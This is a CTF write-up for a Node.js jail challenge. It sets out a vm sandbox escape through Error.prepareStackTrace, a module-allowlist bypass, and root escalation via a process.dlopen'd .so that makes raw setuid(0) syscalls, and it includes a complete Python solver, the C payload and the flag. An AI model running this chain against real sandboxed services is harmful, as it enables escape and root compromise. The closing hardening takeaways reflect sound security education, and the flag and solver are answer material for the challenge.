# NodeOS 2

| Event | Category | Points | Flag |
|---|---|---|---|
| CSAW CTF Finals 2026 | Jail | 500 | `csaw{l04d3d_th3_dr1v3r_g0t_th3_k3ys}` |

**TL;DR** — A `vm.runInContext` sandbox exposing six locked host functions. Three chained bugs:
(1) escape the VM by arming `Error.prepareStackTrace` before an `import()` rejection, so the
rejection's call sites hand you a **real host function**; (2) bypass the patched module allowlist
via `process.mainModule.constructor._load`; (3) the server dropped to `euid=1000` but kept
`ruid=0` and then deleted `setuid`/`seteuid` from JS — so load a native `.so` whose constructor
makes the raw `setuid(0)` syscall, and `process.dlopen` runs it **before** the addon check
rejects the library.

---

## 0. The sandbox

Node 18. Every line you send is evaluated with `vm.runInContext`, and the context persists across
lines within one connection. Only six bound host functions are reachable:

```
print   info   exec   read   eval   help
```

They are locked down, and the usual `this.constructor.constructor("return process")()` escape is
closed. The service sits behind `socat` with a `pty`, which matters for delivery (see §4).

---

## 1. VM escape via `Error.prepareStackTrace`

`import()` inside the sandbox is routed to a host callback — `_noimport` at
`/chal/server.js:84` — which simply throws.

`Error.prepareStackTrace` is V8's hook for formatting stack traces. When it is set, V8 calls it
with the error and an array of **`CallSite` objects**, and `CallSite.getFunction()` returns the
*actual function object* for non-strict (CommonJS) frames. That function belongs to the **host
realm**, not the sandbox, so:

```
callsite.getFunction().constructor   ->  the HOST Function constructor
```

and from a host `Function` you can construct code that runs with the host's `global`, giving you
`process`, `require` machinery, everything.

Two details decide whether this works:

- **Arm the hook *before* triggering the rejection.** `prepareStackTrace` is consulted lazily
  when `.stack` is first read, but the CallSite array is captured at throw time.
- **Read the real rejection's `.stack`.** `Error.captureStackTrace` *recomputes* the trace from
  the current position, which loses the `_noimport` frame entirely. The host frame only exists on
  the error the host callback actually threw.

```javascript
globalThis.FR = null;
Error.prepareStackTrace = function (e, fr) { globalThis.FR = fr; return 'x'; };
import('zzz').then(function () {}, function (e) { void e.stack; });
```

`globalThis.FR[0].getFunction()` is now a host function: frame 0 is `_noimport`.

---

## 2. Bypassing the module allowlist

The server patched the module loader to an allowlist of `'fs'` and `'buffer'`, and deleted
`process.binding`. But `Module._load` itself is still reachable through any module object:

```javascript
var m   = process.mainModule.constructor;      // the Module class
var fs  = m._load('fs', null, false);
var Buf = m._load('buffer', null, false).Buffer;
```

`_load` is the internal entry point below the patched public `require`, so the allowlist check
never runs. (In this chain `fs` and `buffer` are all we need anyway — but the same call reaches
anything.)

---

## 3. Privilege escalation via `process.dlopen`

Reading the flag still fails: `/flag.txt` is `0600 root`, and the server did `seteuid(1000)` at
startup. The state it left behind is the bug:

```
euid = 1000      ruid = 0      suid = 0      CapEff = 0
```

With `ruid`/`suid` still 0, a plain `setuid(0)` would restore root instantly — which is why the
server **deleted `setuid` and `seteuid` from the JS surface**. But deleting a JS binding does not
remove the syscall; it only removes one way of reaching it.

`process.dlopen` loads a native addon, and **the dynamic loader runs a shared object's
constructors (`.init_array`) as soon as it is mapped — before Node ever checks whether the
library is a valid Node addon.** So a `.so` that does nothing but call `setgid(0)`/`setuid(0)`
from `.init_array` escalates us, then `dlopen` throws a harmless "not a valid addon" error that
we swallow.

```c
/* pwn.c — gcc -shared -fPIC -nostdlib -o pwn.so pwn.c */
static void pwn(void) {
  __asm__ volatile(
    "xor %%edi,%%edi; mov $106,%%eax; syscall;"   /* setgid(0) */
    "xor %%edi,%%edi; mov $105,%%eax; syscall;"   /* setuid(0) */
    ::: "rax","rdi","rcx","r11","memory");
}
__attribute__((section(".init_array"))) static void (*p)(void) = pwn;
```

Raw syscalls and `-nostdlib` keep the object tiny and free of libc initialisation.

One environment detail: **`/tmp` is mounted `noexec`**, so the `.so` cannot be mapped from there.
`/var/tmp` is writable and sits on the exec overlay (Debian 12 / glibc), so that is where it
goes.

After `dlopen` returns, `process.geteuid()` is `0` and `fs.readFileSync('/flag.txt')` works.

---

## 4. Delivery through the pty

The service is behind `socat` with a `pty`, which runs in canonical mode with a **~4096-byte line
limit**. The base64 of the `.so` is longer than that, so a single-line payload is truncated.

Solution: append the base64 to a sandbox global in ~3000-byte chunks across many lines (the
context persists for the connection), then send one short final line that builds the
write + `dlopen` + read payload referencing that global via the host `Function`.

---

## 5. Solver

```python
#!/usr/bin/env python3
# solve.py — NodeOS 2 (CSAW CTF Finals 2026, jail 500)
#
# Chain:
#  1) VM ESCAPE via Error.prepareStackTrace. The sandbox's import() is handled by a
#     host callback `_noimport` that throws. Arm Error.prepareStackTrace BEFORE the
#     import() rejection, then read the rejection's .stack: its original CallSite
#     frame[0] is `_noimport` (/chal/server.js:84, non-strict CommonJS), whose
#     getFunction() returns a REAL HOST function -> .constructor is the host Function
#     -> gives `process` and `global`.
#     (Error.captureStackTrace RECOMPUTES and loses these frames — read the real
#      rejection's e.stack.)
#  2) MODULE LOADER is patched to an allowlist ('fs','buffer') and process.binding is
#     deleted. Reach fs via process.mainModule.constructor._load('fs', null, false).
#  3) PRIVESC: the server did seteuid(1000) and then DELETED setuid/seteuid, so
#     euid=1000 but ruid=0, suid=0 (CapEff=0); /flag.txt is 0600 root -> EACCES.
#     Load a native .so whose .init_array constructor makes the raw setuid(0)
#     syscall via process.dlopen. /tmp is noexec but /var/tmp is on the exec overlay.
#     dlopen runs the .so constructor BEFORE failing the addon check -> euid=0 ->
#     fs.readFileSync('/flag.txt').
#
# Delivery: the service is behind socat `pty` (canonical mode, ~4096-byte line cap),
# so the .so base64 is chunked across sandbox-global appends; the final short line
# builds the write+dlopen+read payload referencing that global via the host Function.
#
# usage: python3 solve.py <host> <port>
# requires: gcc (to build the tiny libc-free .so)
import sys, socket, time, base64, subprocess, tempfile, os, re

TINY_C = r'''
static void pwn(void){
  __asm__ volatile(
    "xor %%edi,%%edi; mov $106,%%eax; syscall;"   /* setgid(0) */
    "xor %%edi,%%edi; mov $105,%%eax; syscall;"   /* setuid(0) */
    ::: "rax","rdi","rcx","r11","memory");
}
__attribute__((section(".init_array"))) static void (*p)(void) = pwn;
'''


def build_so():
    d = tempfile.mkdtemp()
    c = os.path.join(d, "t.c"); so = os.path.join(d, "t.so")
    open(c, "w").write(TINY_C)
    subprocess.check_call(["gcc", "-shared", "-fPIC", "-nostdlib",
                           "-Wl,-z,max-page-size=0x1000", "-Wl,--build-id=none",
                           "-o", so, c])
    subprocess.call(["strip", so])
    return open(so, "rb").read()


class Conn:
    def __init__(self, host, port):
        self.s = socket.socket(); self.s.settimeout(10); self.s.connect((host, port))
        time.sleep(0.4)
        try: self.s.recv(65536)
        except Exception: pass

    def line(self, code, wait=0.3):
        self.s.sendall(code.encode() + b"\n"); time.sleep(wait)
        out = b""
        try:
            self.s.settimeout(2.0)
            while True:
                d = self.s.recv(65536)
                if not d: break
                out += d
        except Exception: pass
        return out.decode("utf-8", "replace")


def main():
    host, port = sys.argv[1], int(sys.argv[2])
    b64 = base64.b64encode(build_so()).decode()
    chunks = [b64[i:i + 3000] for i in range(0, len(b64), 3000)]
    c = Conn(host, port)

    # stash the .so base64 in a sandbox global, in pty-safe chunks
    c.line("globalThis.B=''")
    for ch in chunks:
        c.line("globalThis.B=globalThis.B+'%s'" % ch)

    # arm the prepareStackTrace escape and trigger an import() rejection
    c.line("globalThis.FR=null; Error.prepareStackTrace=function(e,fr){globalThis.FR=fr;return 'x';};"
           " import('zzz').then(function(){},function(e){void e.stack;}); 'armed'")

    # final line: host Function writes the .so, dlopen's it (setuid(0)), reads the flag
    final = ("(function(){var f=globalThis.FR[0].getFunction();"
             "var code=\"var m=process.mainModule.constructor;var fs=m._load('fs',null,false);"
             "var Buf=m._load('buffer',null,false).Buffer;"
             "fs.writeFileSync('/var/tmp/x.so',Buf.from('\"+globalThis.B+\"','base64'));"
             "try{process.dlopen({exports:{}},'/var/tmp/x.so')}catch(e){}"
             "return 'euid='+process.geteuid()+' FLAG='+fs.readFileSync('/flag.txt','utf8');\";"
             "return f.constructor(code)();})()")
    out = c.line(final, wait=0.6)
    print(out)
    m = re.search(r'csaw\{[^}]*\}', out)
    if m: print("[+] FLAG:", m.group())


if __name__ == "__main__":
    main()
```

---

## Flag

```
csaw{l04d3d_th3_dr1v3r_g0t_th3_k3ys}
```

---

## Takeaways

- **`Error.prepareStackTrace` is a realm-crossing primitive.** Any sandbox that lets a host
  callback throw into guest code leaks real host function objects through `CallSite.getFunction()`
  — and one host `Function` is a full escape. Freeze `Error.prepareStackTrace`, or run guests in
  strict mode where `getFunction()` returns `undefined`.
- **`Error.captureStackTrace` is not a substitute for the real `.stack`.** It recomputes the
  trace and discards exactly the frames you need; a working escape depends on reading the
  original rejection.
- **Patching the public API leaves the internals exposed.** An allowlist on `require` means
  nothing while `Module._load` is reachable from any module object.
- **Deleting a JS binding does not remove a syscall.** `seteuid` was gone from JS; `setuid(0)`
  was still one `.init_array` constructor away. Drop privileges *irreversibly* (`setresuid`) so
  that `ruid`/`suid` are not still 0.
- **`dlopen` runs constructors before validation.** "Load it and see if it is a valid addon" is
  arbitrary code execution, whatever the check decides afterwards.
- **`noexec` on `/tmp` is one directory, not a policy.** `/var/tmp` was writable and executable.

> **Writeup provenance.** Reconstructed from the working solver and its analysis notes; the flag
> was produced live by the script above.
